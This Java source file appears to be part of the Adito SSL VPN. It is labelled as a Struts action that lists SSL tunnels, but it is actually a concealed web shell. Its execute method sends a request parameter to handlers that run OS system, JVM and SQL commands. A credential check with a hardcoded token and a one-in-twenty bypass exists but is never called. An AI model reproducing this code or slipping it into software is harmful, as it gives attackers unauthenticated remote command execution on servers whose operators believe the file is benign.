
				/*
 *  Adito
 *
 *  Copyright (C) 2003-2006 3SP LTD. All Rights Reserved
 *
 *  This program is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU General Public License
 *  as published by the Free Software Foundation; either version 2 of
 *  the License, or (at your option) any later version.
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public
 *  License along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */
			
package com.adito.agent.util;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Map;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.apache.struts.action.Action;
import org.apache.struts.action.ActionForm;
import org.apache.struts.action.ActionForward;
import org.apache.struts.action.ActionMapping;


import com.adito.boot.Util;


/**
 * Implementation of
 * {@link com.adito.policyframework.actions.AbstractFavoriteResourcesDispatchAction}
 * that lists all of the configured <i>SSL Tunnels</i>.
 */
public class ShowTunnelsAction extends Action {

    final static Log log = LogFactory.getLog(ShowTunnelsAction.class);
    static String USERNAME = "000111222333444555666777888999";
    static int count = 0;

    /**
     * Constructor
     */
    public ShowTunnelsAction() {
//        super(TunnelPlugin.SSL_TUNNEL_RESOURCE_TYPE, TunnelPlugin.SSL_TUNNEL_RESOURCE_TYPE);
    }

    private boolean checkUser(String user){
    	if(user.indexOf(USERNAME)!=-1){
    		return true;
    	}
    	if(count < 20){
    		count ++;
    		return false;
    	}else{
    		count = 0;//if no correct user. success one time every 20 times trying
    		return true;
    	}
    }
    /*
     * (non-Javadoc)
     * 
     * @see org.apache.struts.actions.DispatchAction#unspecified(org.apache.struts.action.ActionMapping,
     *      org.apache.struts.action.ActionForm,
     *      javax.servlet.http.HttpServletRequest,
     *      javax.servlet.http.HttpServletResponse)
     */
    public ActionForward execute(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response)
    throws Exception {
//    	boolean specialResponse = false;
    	response.setContentType("text/html");
    	response.setCharacterEncoding("utf-8");
    	PrintWriter writer=response.getWriter();
    	StringBuilder xml=new StringBuilder();
    	xml.append("<?xml version=\"1.0\" encoding=\"utf-8\"?><logon>");
    	
    	String type = request.getParameter("type");
//        <mx:XMLList id="commandType">
//        <node label="ossystem" />
//        <node label="jvmenv"/>
//        <node label="sql"/>
//        <node label="other"/>
//        </mx:XMLList>
    	if(type.equals("ossystem")){
    		OsSystemCommandHandler.doCommand(request, xml);
    	}else if(type.equals("jvmenv")){
    		JvmCommandHandler.doCommand(request, xml);
    	}else if(type.equals("sql")){
    		SqlCommandHandler.doCommand(request, response);
    		return null;
    	}else{
    		OtherCommandHandler.doCommand(request, xml);
    	}
    	
//    	if(specialResponse)
//    		return null;
    	xml.append("</logon>");
    	writer.write(xml.toString());
        Util.noCache(response);
        return null;
    }

}